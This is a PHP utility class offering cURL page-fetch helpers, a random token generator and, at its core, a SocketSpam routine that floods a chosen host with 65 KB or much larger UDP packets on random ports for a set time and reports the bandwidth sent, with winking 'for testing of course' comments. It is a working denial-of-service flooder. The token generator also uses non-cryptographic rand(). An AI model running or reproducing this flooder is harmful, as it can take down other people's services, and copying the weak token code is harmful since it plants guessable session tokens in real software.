<?php
  class PSMPacket extends PSMExtra {
    #
      #
      /* Packet class meant to manage cURL and packets.
        Lots of these functions will be minor as they are what I use.
        Always being added.
      */


      /* Initializes the Packets class. */
        public function InitPackets() {
          # Run when the user wants to initialize packets.
        }

      /* Takes in the URL and will return the url given. [HTML From page] */
        public function curlreturnpage($url = 'http://google.com') {
          $curl_handler = curl_init();

          // Set the URL.
          $url = str_replace('http://','',$url);
          curl_setopt($curl_handler, CURLOPT_URL, $url);

          curl_setopt($curl_handler, CURLOPT_RETURNTRANSFER, 1);
          // Output.
          $opt = curl_exec($curl_handler);
          curl_close($curl_handler);

          return $opt;
        }
      /* Will just output the page. */
        public function curlshowpage($url = 'http://google.gom') {
          echo $page = $this->curlreturnpage($url);
          return $page;
        }


      /* Generates a random pseudo-token. */
        public function tokenGenerate($length = 32) {
          # Charset.
            $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ:=;,.<>[]{}\_+-@#$%^&*()';
            $charactersLength = strlen($characters);
            $randomString = '';
          # Looping the $length and generating the token.
              for ($i = 0; $i < $length; $i++) {
                  $randomString .= $characters[rand(0, $charactersLength - 1)];
              }
            return $_SESSION['Token'] = $randomString;
        }

      /* Some socket fucntions. */

        /* Opening a specific socket given from the location. */
          public function Socket($loc = 'udp://127.0.0.1', $port = 13, callable $do) {
            // Making the socket.
            $Socket = fsockopen($loc, $port, $errno, $errstr);
              if (!$Socket) echo "PSM Socket Error: $errno - $errstr <br/> \n";
              else $do($Socket, $this);
          }

        # The vars to specify what type of spams you want to do.
          CONST TCP = 'TCP';
          CONST UDP = 'UDP';

        /* Packet spam. - For testing use of course. ;) ...
          NOTE: This function is currently super under optimized and was just made
          for some testing. :))) */
          public function SocketSpam($type = 'TCP', $host, $port = false, $length = 5, $super_packet = false) {
            # Spam needs.
              ignore_user_abort(true);
              set_time_limit($length + 60);

            if ($type == 'UDP') {
              $max_time = time() + (string) $length;
              $packet = ""; # Initial Packet.
              $packets = 0; # Keeping count of the amount of packets we've sent.
              # Making large packet.
              while (strlen($packet) < 65000) $packet .= Chr(255);
              if ($super_packet) {
                # MAKING THE SUPER PACKET!
                ini_set('memory_limit', 1231251212);
                $packet = $packet . $packet . $packet . $packet . $packet . $packet;
                $packet = $packet . $packet . $packet . $packet . $packet . $packet;
                $packet = $packet . $packet . $packet . $packet . $packet . $packet;
                $packet = $packet . $packet . $packet . $packet . $packet . $packet . $packet . $packet;
                # SUPER PACKET MADEEEEEEE!!!!!!!!!!!!
                  # i has 2 much fun wit dis.
              }


              $bytes = strlen($packet);
              $kb = $bytes / 1000 * 2;
              $mb = $kb / 1000; # Sets size of packets. - in MB

              while (true) {
                if (time() > $max_time) break;
                # SocketSpamSO returns the packet +1 if it was successfully done.
                $packets = $this->SocketSpamSO($type, $host, $packets, $packet);
              } # $packets comes out with the total amount of packets we sent.

              if ($packets) {
                # We did it! We spammed the server for TESTING of course for you!
                echo "we spammed <b>$host</b> for <b>$length</b> seconds successfully and sent a load of <b>{$mb}MB</b> / <b>{$kb}KB</b> <br/>
                we sent <b>$packets</b> packets,
                <b>".round($packets / $length)."</b> packets/s, and <b>".($mb / $length)."MB/s</b>, or <b>".($kb / $length)."KB/s</b>
                ";
              }


              # END OF PACKET SPAM FOR TCP ADRESSES.
            } else if ($type == 'UDP') {

            } else echo 'PSM Packet Spam Error: unknown type <b>'.$type.'</b>';
          }
        /* Socket Spam Socket Open - Management for the Socket Spam function. */ 
          public function SocketSpamSO($type, $host, $packets, $packet) {
            if ($type == 'UDP') {
              # UDP SPAM SOCKET OPENING.
              $randomPort = rand(1,65535); # The random port we'll use.
              @$SocketHandler = fsockopen('udp://'.$host, $randomPort, $errono, $errstr, 5);
              # Checking if the Socket connected correctly.
              if ($SocketHandler) {
                fwrite($SocketHandler, $packet);
                fclose($SocketHandler);
                $packets++;
              } return $packets;
            } else if ($type == 'TCP') {
              # TCP SPAM SOCKET OPENING.
                # TBD.
            }
          }















      #
  }
